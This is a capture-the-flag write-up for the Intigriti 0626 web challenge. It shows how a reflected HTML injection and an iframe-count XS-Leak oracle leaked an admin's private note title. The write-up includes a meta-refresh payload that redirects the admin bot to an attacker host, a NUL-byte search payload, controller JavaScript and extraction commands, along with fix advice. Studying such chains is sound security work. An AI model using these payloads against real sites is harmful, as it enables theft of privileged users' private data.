---
title: "Intigriti 0626: Leaking Admin Private Notes with Reflected HTML Injection and XS-Leak"
date: 2026-06-22 18:00:00 +0700
categories: [Writeups, Web Security]
tags: [Intigriti, XS-Leak, HTML-injection, reflected-xss, CSP, iframe-oracle, bug-bounty, web-security]
permalink: /posts/intigriti-0626-html-injection-xs-leak/
---

> **Summary:** I solved the Intigriti 0626 challenge by turning a CSP-limited reflected HTML injection in `/search` into an XS-Leak oracle. The final exploit redirected the admin bot to an attacker-controlled controller and leaked the admin's private note title one character at a time.
{: .prompt-info }

## Introduction

This write-up covers my solution for the Intigriti 0626 challenge.

At first glance, the application looked fairly locked down. The challenge used a strict Content Security Policy, so direct JavaScript execution through a classic reflected XSS payload was not possible.

However, the `/search` endpoint reflected the `q` parameter unsafely when no note matched the search query. That still gave an HTML injection primitive.

The key idea was to avoid trying to execute JavaScript on the challenge origin. Instead, I used the injection to redirect the admin bot to my own controller, then used a cross-origin iframe length oracle to test whether the admin had a private note title matching a candidate prefix.

Repeating that oracle leaked the private note title, which contained the flag.

## Target

- **Challenge:** Intigriti 0626
- **Asset:** `https://challenge-0626.intigriti.io`
- **Vulnerable endpoint:** `/search`
- **Bot trigger:** `/report`
- **Vulnerability type:** Reflected HTML injection
- **Technique:** XS-Leak using cross-origin iframe `contentWindow.length`

## Initial Observation

The application had a notes feature and a report feature.

The report page allowed a user to submit a path for the admin bot to visit:

```text
/report
```

The page itself mentioned this requirement:

```text
Report a path to admin
Submit a path on this site for the admin to visit.
Must start with /
```

The interesting endpoint was `/search`, which accepted parameters like:

```text
/search?owner=admin&q=test&description=d
```

When a note was not found, the value of `q` was reflected into the response without proper HTML escaping:

```html
<p>{q} not found</p>
```

This meant I could inject HTML into the "not found" branch.

## CSP Limitation

A direct XSS payload was not enough because the challenge used a strict CSP.

For example, trying to inject a script was not useful. Inline JavaScript execution was blocked, and loading arbitrary scripts was also restricted.

However, CSP did not fully prevent all HTML-based behavior. In particular, I could still inject a meta refresh tag:

```html
<meta http-equiv=refresh content=0;url=https://ATTACKER-CONTROLLER/r/RUN_ID>
```

This was enough to redirect the admin bot away from the challenge site to my own server.

That turned a CSP-limited HTML injection into an admin-controlled navigation primitive.

## Redirecting the Admin Bot

The report path contained a reflected meta refresh payload inside the `q` parameter:

```text
/search?owner=admin&q=<meta http-equiv=refresh content=0;url=https://ATTACKER-CONTROLLER/r/RUN_ID>&description=d
```

Submitted through `/report`, the admin bot visited the vulnerable search page, parsed the injected meta refresh, and was redirected to my controller.

I first confirmed this with a canary endpoint.

```powershell
node solve.js canary --timeout 90000
```

A successful canary looked like this:

```json
{
  "type": "canary",
  "ip": "34.140.37.218",
  "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/133.0.6943.16 Safari/537.36"
}
```

![Canary hit from the admin bot](/assets/img/posts/intigriti-0626/canary.png)
_The admin bot reached my controller after being redirected by the injected meta refresh payload._

## Root Cause

The root cause had two parts.

First, `/search` reflected raw user input in the "not found" branch:

```html
<p>{q} not found</p>
```

Second, the search logic used SQL `LIKE`.

This created a useful difference between the server-side search behavior and the HTML reflection behavior when a NUL byte was used.

The payload shape was:

```js
candidate + '%' + String.fromCharCode(0) + '<iframe></iframe>'
```

Conceptually:

```text
<known-prefix>%\x00<iframe></iframe>
```

The SQL search pattern was effectively truncated at the NUL byte, while the HTML reflection still preserved the injected HTML after the NUL byte.

This gave an oracle:

- If the admin has a note title matching `candidate%`, the note is found.
- If a note is found, the "not found" branch is not rendered.
- If the "not found" branch is not rendered, the injected `<iframe>` is absent.
- If there is no match, the injected `<iframe>` is rendered.

## The XS-Leak Oracle

Even though the challenge page is cross-origin, the attacker-controlled parent page can still read:

```js
iframe.contentWindow.length
```

This value reveals how many child frames exist inside the framed document.

The oracle behavior was:

```text
match: iframe.contentWindow.length === 0
miss:  iframe.contentWindow.length === 1
```

Why?

For a matching prefix, the search result page did not render the injected `<iframe>`, so the framed document had no child frames.

For a non-matching prefix, the "not found" branch reflected the injected `<iframe>`, so the framed document contained one child frame.

This provided a clean boolean oracle for prefix matching.

## Controller Page

The attacker-controlled controller served an oracle page to the admin bot.

For each candidate prefix, it created a hidden iframe pointing to the challenge search endpoint:

```js
f.src =
  'https://challenge-0626.intigriti.io/search?owner=admin&q=' +
  encodeURIComponent(prefix + '%' + String.fromCharCode(0) + '<iframe></iframe>') +
  '&description=d';
```

Then it waited for the iframe to load and read:

```js
f.contentWindow.length
```

The result was logged back to the controller:

```js
const match = len === 0;
```

The relevant behavior from the exploit script was:

```js
f.onload = () => {
  let len = -1;
  try {
    len = f.contentWindow.length;
  } catch (e) {}

  finish(len === 0, 'load', len);
};
```

## Exploit Flow

The full exploit flow was:

1. Start a local HTTP controller on `127.0.0.1:8780`.
2. Expose it publicly with `localhost.run`.
3. Register and log in with a temporary user.
4. Submit a report path containing the meta refresh HTML injection.
5. The admin bot visits `/search`.
6. The injected meta refresh redirects the admin bot to the controller.
7. The controller serves an oracle page.
8. The oracle page frames `/search?owner=admin&q=<candidate>%\x00<iframe></iframe>`.
9. `iframe.contentWindow.length` reveals whether the candidate prefix matches an admin private note title.
10. Repeat character by character until the full note title is leaked.

## Proof of Concept

The PoC script supported three useful modes:

```text
canary  - confirm the admin bot reaches the controller
chunk   - test a group of candidate next characters
auto    - extract the value automatically
```

### 1. Confirm Admin Bot Redirection

```powershell
node solve.js canary --timeout 90000
```

Expected result:

```json
{
  "type": "canary",
  "nonce": "canary-...",
  "ip": "34.140.37.218",
  "ua": "Mozilla/5.0 ... HeadlessChrome ..."
}
```

### 2. Confirm the Flag Prefix

The expected flag format started with:

```text
INTIGRITI{
```

To verify that prefix:

```powershell
node solve.js chunk --prefix "INTIGRITI" --chars "{" --timeout 90000
```

A successful result looked like:

```json
{
  "prefix": "INTIGRITI{",
  "match": true,
  "len": 0,
  "kind": "load"
}
```

![Prefix check result](/assets/img/posts/intigriti-0626/prefix-check.png)
_The oracle confirmed that the admin note title starts with the expected flag prefix._

### 3. Extract Automatically

The automatic extractor tested candidate characters in chunks:

```powershell
node solve.js auto --prefix "INTIGRITI{" --rounds 45 --chunk-size 8 --timeout 90000 --cooldown 65000
```

For UUID-style flag positions, the script tested hexadecimal characters. At known dash positions, it tested `-`. At the end, it tested `}`.

Example output:

```json
{
  "prefix": "INTIGRITI{019ea42e",
  "match": true,
  "len": 0,
  "kind": "load"
}
```

### 4. Manual Extraction

The same oracle could be used manually:

```powershell
node solve.js chunk --prefix "<known-prefix>" --chars "01234567" --timeout 90000
node solve.js chunk --prefix "<known-prefix>" --chars "89abcdef" --timeout 90000
```

At UUID dash positions:

```powershell
node solve.js chunk --prefix "<known-prefix>" --chars "-" --timeout 90000
```

To verify the closing brace:

```powershell
node solve.js chunk --prefix "<known-prefix-without-brace>" --chars "}" --timeout 90000
```

A successful final check returned:

```json
{
  "match": true,
  "len": 0
}
```

![Final flag verification](/assets/img/posts/intigriti-0626/final-check.png)
_The final candidate was verified with the closing brace._

## Payloads Used

### Report Payload

```html
<meta http-equiv=refresh content=0;url=https://ATTACKER-CONTROLLER/r/RUN_ID>
```

Encoded inside the reported path:

```text
/search?owner=admin&q=%3Cmeta%20http-equiv%3Drefresh%20content%3D0%3Burl%3Dhttps%3A%2F%2FATTACKER-CONTROLLER%2Fr%2FRUN_ID%3E&description=d
```

### Oracle Payload

```text
/search?owner=admin&q=<candidate>%\x00<iframe></iframe>&description=d
```

In JavaScript:

```js
prefix + '%' + String.fromCharCode(0) + '<iframe></iframe>'
```

## Why This Leaks Admin Data

The attacker cannot directly read the admin's private notes cross-origin.

However, the attacker can make the admin bot load a page that performs same-origin searches as the admin. The response shape differs depending on whether a note title matches a candidate prefix.

The attacker-controlled parent page cannot read the response body, but it can observe a side effect: the number of child frames inside the cross-origin iframe.

This is enough to convert the search result difference into a one-bit leak:

```text
Does the admin have a private note title matching this prefix?
```

Repeating the question leaks the full title.

## Impact

An authenticated attacker could submit a crafted report that makes the admin bot leak confidential admin-only note titles.

In this challenge, the private note title contained the flag. In a real application, the same pattern could expose sensitive internal note titles, private document names, ticket subjects, or other search-indexed metadata.

The issue is impactful even without script execution because the attack uses HTML injection plus browser side-channel behavior rather than direct JavaScript execution on the target origin.

## Recommended Fix

The primary fix is to HTML-escape all user-controlled output in `/search`, especially the reflected `q` value.

For example, instead of rendering:

```html
<p>{q} not found</p>
```

render an escaped value:

```html
<p>{{ escaped_q }} not found</p>
```

Additional hardening:

- Reject or normalize NUL bytes in search input.
- Escape SQL `LIKE` wildcard characters when they are not intended as wildcards.
- Keep using parameterized queries.
- Avoid reflecting raw search input in HTML contexts.
- Do not rely on CSP as the main defense against output encoding bugs.
- Consider adding `X-Frame-Options` or `frame-ancestors` where framing is not needed.
- Add regression tests for:
  - reflected HTML in `q`
  - NUL byte handling
  - wildcard behavior in search
  - admin bot report navigation

## Takeaways

The interesting part of this challenge was that CSP successfully blocked classic JavaScript execution, but the bug was still exploitable.

The final chain did not need to execute JavaScript on `challenge-0626.intigriti.io`. It only needed:

1. an HTML injection primitive,
2. an admin bot that could be redirected,
3. a searchable admin-only secret,
4. a response-shape difference,
5. a browser observable side effect.

This is a good reminder that fixing XSS is not only about blocking `<script>`. Output encoding still matters, and small response differences can become powerful XS-Leak oracles when an attacker can involve a privileged browser.

## Disclosure Note

This write-up was prepared after solving the challenge. Public publication should only happen after the challenge has ended and public write-ups are allowed.
